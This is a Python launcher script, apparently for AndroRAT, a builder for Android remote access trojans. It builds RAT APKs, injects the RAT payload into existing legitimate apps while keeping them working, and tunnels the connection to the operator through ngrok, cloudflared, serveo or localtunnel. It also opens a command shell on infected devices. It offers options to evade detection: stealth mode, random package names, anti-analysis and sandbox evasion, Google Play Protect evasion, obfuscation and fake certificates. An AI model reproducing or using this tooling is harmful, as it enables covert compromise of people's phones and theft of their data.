#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import *
import argparse
import sys
import platform
from tunneling import create_tunnel_with_alternatives

# Try to import pyngrok but don't fail if not available
try:
    from pyngrok import ngrok, conf
    NGROK_AVAILABLE = True
except ImportError:
    NGROK_AVAILABLE = False
    print(stdOutput("warning")+"\033[1mpyngrok not available - will use alternative tunneling services")
    print(stdOutput("info")+"\033[1mTo use ngrok: pip3 install pyngrok")
    
clearDirec()

#                     _           _____         _______
#     /\             | |         |  __ \     /\|__   __|
#    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
#   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
#  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
# /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
#                                        - By karma9874


parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('--ngrok',help='For using ngrok tunneling (requires credit card for TCP)',action='store_true')
parser.add_argument('--tunnel',help='Auto-select best available tunneling service',action='store_true')
parser.add_argument('--tunnel-service',metavar="<service>", type=str, choices=['ngrok','cloudflared','serveo','localtunnel','auto'], 
                    default='auto', help='Choose tunneling service: ngrok, cloudflared, serveo, localtunnel, auto')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
parser.add_argument('-icon','--icon',help='Visible Icon',action='store_true')
parser.add_argument('--stealth',help='Enable maximum stealth mode with detection evasion',action='store_true')
parser.add_argument('--random-package',help='Use random package name for evasion',action='store_true')
parser.add_argument('--anti-analysis',help='Enable advanced anti-analysis and sandbox evasion',action='store_true')
parser.add_argument('--play-protect-evasion',help='Enable Play Protect specific evasion techniques',action='store_true')
parser.add_argument('--advanced-obfuscation',help='Apply advanced string and code obfuscation',action='store_true')
parser.add_argument('--fake-certificates',help='Use fake certificate metadata for trust evasion',action='store_true')
parser.add_argument('--inject',help='Inject RAT into existing APK instead of building new one',action='store_true')
parser.add_argument('--target-apk',metavar="<APK Path>", type=str,help='Path to target APK for injection')
args = parser.parse_args()



import sys

# Check Python version properly 
if sys.version_info < (3, 6):
    print(stdOutput("error")+"\033[1mPython version should be 3.6 or higher")
    sys.exit()

if args.build:
    port_ = args.port
    icon=True if args.icon else None
    
    # Check for injection mode
    if args.inject:
        if not args.target_apk:
            print(stdOutput("error")+"\033[1m--target-apk required when using --inject")
            sys.exit()
        if not args.ip or not args.port:
            print(stdOutput("error")+"\033[1mArguments Missing: -i and -p required for injection")
            sys.exit()
        if not args.output:
            print(stdOutput("error")+"\033[1m-o (output) required for injection mode")
            sys.exit()
            
        # Create evasion options dictionary for injection
        evasion_options = {
            'stealth': args.stealth,
            'random_package': args.random_package,
            'anti_analysis': args.anti_analysis if hasattr(args, 'anti_analysis') else False,
            'play_protect_evasion': args.play_protect_evasion if hasattr(args, 'play_protect_evasion') else False,
            'advanced_obfuscation': args.advanced_obfuscation if hasattr(args, 'advanced_obfuscation') else False,
            'fake_certificates': args.fake_certificates if hasattr(args, 'fake_certificates') else False
        }
        
        print(stdOutput("info")+"\033[1mStarting APK injection mode...")
        success = inject_rat_into_apk(args.target_apk, args.ip, args.port, args.output, evasion_options)
        
        if success:
            print(stdOutput("success")+"\033[1mAPK injection completed successfully!")
            print(stdOutput("info")+"\033[92mTarget app functionality preserved with RAT payload injected!")
        else:
            print(stdOutput("error")+"\033[1mAPK injection failed!")
            sys.exit()
    
    # Handle tunneling options (original build mode)
    elif args.ngrok or args.tunnel:
        port = 8000 if not port_ else int(port_)
        
        # Determine which tunneling service to use
        if args.ngrok and NGROK_AVAILABLE:
            service = "ngrok"
        elif args.tunnel:
            service = args.tunnel_service
        else:
            service = "auto"
            
        print(stdOutput("info")+"\033[1mSetting up tunnel...")
        
        # Use new tunneling system
        tunnel_manager, tunnel_result = create_tunnel_with_alternatives(port, service)
        
        if tunnel_result:
            ip, tunnel_port, tunnel_url = tunnel_result
            print(stdOutput("success")+"\033[1mTunnel established successfully!")
            build_with_evasion(ip, tunnel_port, args.output, True, port_, icon, {
                'stealth': args.stealth,
                'random_package': args.random_package,
                'anti_analysis': getattr(args, 'anti_analysis', False),
                'play_protect_evasion': getattr(args, 'play_protect_evasion', False), 
                'advanced_obfuscation': getattr(args, 'advanced_obfuscation', False),
                'fake_certificates': getattr(args, 'fake_certificates', False)
            })
            
            # Keep tunnel alive during shell if requested
            if tunnel_manager:
                try:
                    get_shell("0.0.0.0", port)
                finally:
                    tunnel_manager.close_tunnel()
        else:
            print(stdOutput("error")+"\033[1mFailed to establish tunnel")
            print(stdOutput("info")+"\033[1mTry using --tunnel-service to specify a different service")
            print(stdOutput("info")+"\033[1mAvailable services: cloudflared, serveo, localtunnel, ngrok")
            sys.exit()
    else:
        if args.ip and args.port:
            # Create evasion options dictionary
            evasion_options = {
                'stealth': args.stealth,
                'random_package': args.random_package,
                'anti_analysis': args.anti_analysis if hasattr(args, 'anti_analysis') else False,
                'play_protect_evasion': args.play_protect_evasion if hasattr(args, 'play_protect_evasion') else False,
                'advanced_obfuscation': args.advanced_obfuscation if hasattr(args, 'advanced_obfuscation') else False,
                'fake_certificates': args.fake_certificates if hasattr(args, 'fake_certificates') else False
            }
            
            build_with_evasion(args.ip, port_, args.output, False, None, icon, evasion_options)
        else:
            print(stdOutput("error")+"\033[1mArguments Missing")
            print(stdOutput("info")+"\033[1mUse --tunnel for automatic tunneling, or provide -i and -p")

if args.shell:
    if args.ip and args.port:
        get_shell(args.ip,args.port) 
    else:
        print(stdOutput("error")+"\033[1mArguments Missing")